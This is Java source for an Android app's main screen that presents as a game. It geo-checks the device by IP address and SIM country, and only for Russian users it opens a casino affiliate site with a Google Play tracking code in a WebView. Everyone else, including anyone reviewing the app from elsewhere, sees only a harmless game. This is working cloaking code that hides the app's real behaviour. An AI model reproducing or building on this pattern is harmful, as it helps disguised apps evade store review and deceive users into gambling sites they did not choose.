package chhar.afgaz.com.chhar;

import android.content.Context;
import android.content.Intent;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.telephony.TelephonyManager;
import android.view.View;
import android.webkit.WebChromeClient;
import android.webkit.WebResourceError;
import android.webkit.WebResourceRequest;
import android.webkit.WebResourceResponse;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.Toast;

import com.androidfung.geoip.IpApiService;
import com.androidfung.geoip.ServicesManager;
import com.androidfung.geoip.model.GeoIpResponseModel;

import retrofit2.Call;
import retrofit2.Callback;

public class MainActivity extends AppCompatActivity {


    private WebView webView;
    private boolean country = true;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        IpApiService ipApiService = ServicesManager.getGeoIpService();
        ipApiService.getGeoIp().enqueue(new Callback<GeoIpResponseModel>() {
            @Override
            public void onResponse(Call<GeoIpResponseModel> call, retrofit2.Response<GeoIpResponseModel> response) {
                if (response.isSuccessful()) {
                    if (!response.body().getCountry().equals("RU")) {
                        country = false;
                    }
                }
                viewGame();
            }

            @Override
            public void onFailure(Call<GeoIpResponseModel> call, Throwable t) {
                country = false;
                viewGame();
            }
        });


    }

    private void viewGame(){
        if (getCountry() && isOnline() && country) {
            webView = findViewById(R.id.web_view);
            webView.setWebViewClient(new WebViewClient() {

                @Override
                public boolean shouldOverrideUrlLoading(WebView view, String url) {
                    view.loadUrl(url);
                    return true;
                }

                @Override
                public void onReceivedError(WebView view, WebResourceRequest request, WebResourceError error) {
                    super.onReceivedError(view, request, error);
                    showGame();
                }

                @Override
                public void onReceivedHttpError(WebView view, WebResourceRequest request, WebResourceResponse errorResponse) {
                    super.onReceivedHttpError(view, request, errorResponse);
                    showGame();
                }
            });
            webView.loadUrl("http://m66e085.winfortuna.com/?lp=rp4&trackCode=aff_1b1b01_34_GooglePlay_2");
        } else {
            showGame();
        }
    }

    private void showGame() {
        Intent intent = new Intent(this, GameActivity.class);
        startActivity(intent);
        finish();
    }


    private boolean getCountry() {
        String countryCodeValue = null;
        if (getSystemService(Context.TELEPHONY_SERVICE) != null)
            countryCodeValue = ((TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE)).getSimCountryIso();
        else
            return false;
        return countryCodeValue != null && (countryCodeValue.equalsIgnoreCase("ru") || countryCodeValue.equalsIgnoreCase("rus"));
    }


    public boolean isOnline() {
        NetworkInfo netInfo = null;
        if (getSystemService(Context.CONNECTIVITY_SERVICE) != null)
            netInfo = ((ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE)).getActiveNetworkInfo();
        else return false;
        return netInfo != null && netInfo.isConnectedOrConnecting();

    }
}
